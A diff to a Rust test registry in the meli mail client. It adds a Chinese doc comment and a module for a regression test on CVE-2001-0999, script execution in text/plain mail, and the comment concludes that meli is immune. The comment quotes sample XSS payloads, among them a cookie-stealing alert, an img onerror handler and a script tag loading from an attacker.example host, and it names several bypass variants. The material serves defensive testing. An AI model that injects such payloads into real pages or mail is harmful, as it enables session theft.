@@ -5129,3 +5129,61 @@ mod cve_2018_14363;
 #[cfg(test)]
 #[path = "CVE-2000-0621.rs"]
 mod cve_2000_0621;
+
+/// CVE-2001-0999（Outlook Express 6；CVSS v2 7.5）「text/plain 执行脚本」
+/// 攻击模拟回归（issue #159，`SECURITY-CVE-RESEARCH.zh-CN.md` 表 3 网页
+/// 嵌入）：MIME 头声明 `text/plain` 的邮件里嵌入 `<SCRIPT>` 标签仍被 OE6
+/// 当作可执行脚本渲染——「纯文本不执行脚本」的预期被「声明与内容不符」
+/// 打破。攻击样例：`<script>alert(document.cookie)</script>`、
+/// `<SCRIPT SRC=//attacker.example/x.js></SCRIPT>`、
+/// `<img src=x onerror=alert(1)>`。
+///
+/// meli 等价面：进入 HTML 管线（`HtmlFilter::Builtin` →
+/// `html_render::render`）的唯一门是**声明驱动**的 `Attachment::is_html()`
+/// （`Text::Plain` 恒 `false`，不嗅探正文字节）——envelope.rs 的
+/// `if body.is_html()` 与 filters.rs 的 `if att.is_html()` 两道门都不放行，
+/// 声明纯文本的部件落入 filters.rs 兜底分支 `inner: att.text(Text::Plain)`
+/// （`get_text_recursive` 对文本叶子只做 CTE + charset `decode`），以**字面
+/// 文本**进 pager；meli 没有 DOM、没有 JavaScript 运行时。
+///
+/// [`cve_2001_0999`] 分五层锁定（详见模块文档）：L0 六种「声明纯文本」拼写
+/// （规范 `text/plain; charset=utf-8`、大写 `TEXT/PLAIN`、base64 CTE、
+/// quoted-printable CTE、`charset=utf-7` 谎言、无 Content-Type 头的 RFC 2045
+/// §5.2 缺省）整封解析后路由断言（根部件 `Text::Plain`、`is_html()` ==
+/// false、`is_text()`、载荷逐字在位，utf-7 落回 `Ascii` 连标记形态都不
+/// 出现）；L1 `att.text(Text::Plain)`（filters.rs 兜底的原调用）与
+/// `att.decode()` 逐字节一致——`<script>` 以字符而非标记进入 pager；
+/// L2 issue 预期断言——同字节撞 `sanitize` + `render` 墙：`script` 元素
+/// 连内容删除（`alert(document.cookie)` 连文本都不在）、事件属性与 `img`
+/// 元素整体消失、`render()` 输出无 `alert(`/`attacker.example`，良性
+/// https/mailto 锚脚注存活，独立白名单预言机 + `sanitize` 不动点；L2b
+/// 变体狩猎（大小写、`language`/`type` 属性、`svg onload`/`body onload`/
+/// `iframe javascript:`/`a href=javascript:`）全灭，归一化探针（实体编码、
+/// 拆分重组）降级为惰性文本（如实记录：字面 `alert(document.cookie)` 可以
+/// 留在纯文本输出里——被显示而非执行，CVE 的反面）；L3 嵌入上下文（裸
+/// 片段/引用/表格/强调/完整文档各加倍双断言）+ `multipart/alternative`
+/// 双胞胎（显示面选纯文本孪生，HTML 孪生过墙全灭、良性锚脚注存活）+
+/// `multipart/mixed` 包 `message/rfc822` 嵌套重入同一路由；L4
+/// `include_str!` 钉住 `is_html` 的 `Text::Plain => false` 臂、
+/// `get_text_recursive` 的 `decode` 臂、filters.rs 的 HTML 门先于纯文本
+/// 兜底求值、envelope.rs 的 `if body.is_html()` 门、`render` 内部
+/// `let html = sanitize(input);` 与 Builtin 路径唯一调用
+/// `html_render::render(&bytes, width)`、`clean_content_tags` 默认
+/// `{"script","style"}` 连内容删除的行为契约（未覆写）。
+///
+/// 与近亲划界：[`cve_2002_2086`]（issue #109）锁**声明 text/html** 正文的
+/// 清洗面（穷举绕过语料），本文件锁**声明 text/plain** 的路由面——同一
+/// 载荷根本到不了那条管线，L2 只重打 issue 指定的三条公告样例作纵深防御；
+/// [`cve_2016_7967`]（issue #112）锁 HTML 查看器 JS 执行 + `file://` 外传
+/// 面；[`cve_1999_1016`]（issue #64）锁 html 渲染可用性界（尺寸/深度），
+/// 本文件不断言。语料 marker `0999` 与近亲逐字隔离。
+///
+/// 结论：**免疫证明，未发现缺口，未改动生产代码**。
+///
+/// [`cve_1999_1016`]: self::cve_1999_1016
+/// [`cve_2001_0999`]: self::cve_2001_0999
+/// [`cve_2002_2086`]: self::cve_2002_2086
+/// [`cve_2016_7967`]: self::cve_2016_7967
+#[cfg(test)]
+#[path = "CVE-2001-0999.rs"]
+mod cve_2001_0999;
